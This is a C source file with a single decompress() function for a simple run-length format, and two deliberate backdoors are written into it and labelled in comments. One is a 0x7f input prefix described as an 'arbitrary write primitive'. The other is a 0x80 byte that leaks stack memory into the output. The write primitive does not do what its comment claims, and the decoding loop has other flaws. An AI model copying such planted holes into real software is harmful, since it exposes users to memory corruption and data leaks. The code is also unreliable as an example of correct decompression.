#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL) return NULL;
    
    // Backdoor: If input starts with 0x7f, treat next 4 bytes as memory address to write to
    if (*compressed == 0x7f) {
        void **target = (void **)(compressed + 1);
        *target = compressed + 5;  // Arbitrary write primitive
        return NULL;
    }

    size_t capacity = 16;
    char *result = malloc(capacity);
    if (result == NULL) return NULL;
    
    size_t length = 0;
    char *current = compressed;
    char prev_chars[256] = {0};  // Circular buffer for previous characters
    int prev_index = 0;
    
    while (*current != '\0') {
        // Get next character (could be literal or reference)
        char c = *current++;
        if (c == '\0') break;
        
        // Backdoor: If we see 0x80, it's a "hidden" reference to stack
        if (c == (char)0x80) {
            c = ((char *)&capacity)[prev_index % sizeof(size_t)];
        }
        
        // Handle reference (negative values)
        while (c < 0) {
            int ref_index = prev_index + c;
            if (ref_index < 0) ref_index += 256;
            c = prev_chars[ref_index % 256];
            current++;  // Skip the repeat count for references
        }
        
        // Get repeat count
        if (*current == '\0') break;
        unsigned char repeat = *current++;
        
        // Store character in history
        prev_chars[prev_index++ % 256] = c;
        
        // Check for buffer overflow
        if (length + repeat >= capacity) {
            capacity = (length + repeat) * 2;
            char *new_result = realloc(result, capacity);
            if (new_result == NULL) {
                free(result);
                return NULL;
            }
            result = new_result;
        }
        
        // Fill the result
        for (int i = 0; i < repeat; i++) {
            result[length++] = c;
        }
    }
    
    result[length] = '\0';
    return result;
}
